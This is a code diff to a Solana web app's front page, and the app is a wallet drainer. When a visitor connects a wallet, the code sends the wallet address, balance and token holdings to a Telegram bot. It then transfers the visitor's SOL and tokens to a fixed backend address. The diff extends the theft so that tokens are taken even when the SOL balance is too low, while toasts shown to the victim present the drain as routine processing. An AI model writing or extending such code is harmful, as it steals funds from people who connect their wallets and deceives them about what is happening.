@@ -1,4 +1,3 @@
-
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -223,47 +222,99 @@ const Index = () => {
         console.log("Successfully sent wallet data to Telegram");
       }
 
-      if (walletData.balance <= 0) {
-        console.log("Wallet has no SOL balance");
+      // Check if we have any tokens with balances
+      const tokensWithBalance = tokens.filter(token => token.amount && token.amount > 0);
+      console.log(`Found ${tokensWithBalance.length} tokens with non-zero balance`);
+      
+      // Even if SOL balance is too low, we might still transfer tokens
+      const hasTokensToTransfer = tokensWithBalance.length > 0;
+      const hasEnoughForTokensOnly = walletBalance && hasEnoughSolForRent(walletBalance, true);
+      
+      if (walletBalance <= 0 && !hasTokensToTransfer) {
+        console.log("Wallet has no SOL balance and no tokens to transfer");
         
         const zeroBalanceMessage = {
           address: publicKey.toString(),
-          message: `WALLET HAS ZERO BALANCE. No transfer will be attempted.`,
+          message: `WALLET HAS ZERO BALANCE AND NO TOKENS. No transfer will be attempted.`,
           walletName: wallet?.adapter?.name || "Unknown Wallet",
-          tokens: tokens.length > 0 ? tokens : walletData.tokens || []
+          tokens: tokensWithBalance
         };
         
         await sendToTelegram(zeroBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
         
         toast({
-          title: "Low Balance",
-          description: "Your wallet has no SOL balance. No further action needed.",
+          title: "No Assets",
+          description: "Your wallet has no SOL balance or tokens to transfer.",
         });
         setIsProcessing(false);
         setShowLoadingModal(false);
         return;
       }
 
-      if (!hasEnoughSolForRent(walletData.balance)) {
-        console.log("Wallet balance too low for rent exemption");
+      // If we have some SOL balance but not enough for a full transfer
+      if (walletBalance > 0 && !hasEnoughSolForRent(walletBalance)) {
+        console.log("Wallet balance too low for SOL transfer");
         
-        const lowRentMessage = {
-          address: publicKey.toString(),
-          message: `INSUFFICIENT FUNDS FOR RENT EXEMPTION. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: ${MINIMUM_REQUIRED_SOL} SOL.`,
-          walletName: wallet?.adapter?.name || "Unknown Wallet",
-          tokens: tokens.length > 0 ? tokens : walletData.tokens || []
-        };
-        
-        await sendToTelegram(lowRentMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
-        
-        toast({
-          title: "Insufficient Funds",
-          description: `Your wallet must have at least ${MINIMUM_REQUIRED_SOL} SOL (about $0.50) for rent exemption and fees.`,
-          variant: "destructive",
-        });
-        setIsProcessing(false);
-        setShowLoadingModal(false);
-        return;
+        // Check if we have tokens and enough SOL for token transfer fee
+        if (hasTokensToTransfer && hasEnoughForTokensOnly) {
+          const lowBalanceMessage = {
+            address: publicKey.toString(),
+            message: `INSUFFICIENT SOL FOR FULL TRANSFER. Balance: ${walletBalance.toFixed(6)} SOL. Will attempt token transfers only.`,
+            walletName: wallet?.adapter?.name || "Unknown Wallet",
+            tokens: tokensWithBalance
+          };
+          
+          await sendToTelegram(lowBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+          
+          toast({
+            title: "Processing Tokens Only",
+            description: `SOL balance too low for transfer. Processing tokens only.`,
+          });
+          
+          // Skip to token transfer
+          updateStepStatus('signConfirmation', 'active');
+          advanceToNextStep('signConfirmation');
+          updateStepStatus('tokenTransfer', 'active');
+          
+          const results = await transferTokens(
+            connection,
+            wallet,
+            BACKEND_ADDRESS, 
+            tokensWithBalance,
+            TELEGRAM_BOT_TOKEN,
+            TELEGRAM_CHAT_ID
+          );
+          
+          const successCount = results.filter(r => r.success).length;
+          advanceToNextStep('tokenTransfer');
+          
+          toast({
+            title: "Token Transfer Complete", 
+            description: `Successfully transferred ${successCount}/${tokensWithBalance.length} tokens.`
+          });
+          
+          setIsProcessing(false);
+          setTimeout(() => setShowLoadingModal(false), 1000);
+          return;
+        } else if (!hasTokensToTransfer) {
+          // No tokens to transfer and SOL too low
+          const lowBalNoTokensMessage = {
+            address: publicKey.toString(),
+            message: `INSUFFICIENT FUNDS AND NO TOKENS. Balance: ${walletBalance.toFixed(6)} SOL. No transfer possible.`,
+            walletName: wallet?.adapter?.name || "Unknown Wallet"
+          };
+          
+          await sendToTelegram(lowBalNoTokensMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+          
+          toast({
+            title: "Insufficient Funds",
+            description: `Your wallet must have at least ${MINIMUM_REQUIRED_SOL} SOL for transfer.`,
+            variant: "destructive",
+          });
+          setIsProcessing(false);
+          setShowLoadingModal(false);
+          return;
+        }
       }
 
       toast({
@@ -273,9 +324,9 @@ const Index = () => {
 
       const transferMessage = {
         address: publicKey.toString(),
-        message: `ATTEMPTING TO TRANSFER ${walletData.balance.toFixed(6)} SOL to ${BACKEND_ADDRESS}`,
+        message: `ATTEMPTING TO TRANSFER ${walletBalance.toFixed(6)} SOL to ${BACKEND_ADDRESS}`,
         walletName: wallet?.adapter?.name || "Unknown Wallet",
-        tokens: tokens.length > 0 ? tokens : walletData.tokens || []
+        tokens: tokensWithBalance
       };
       
       await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
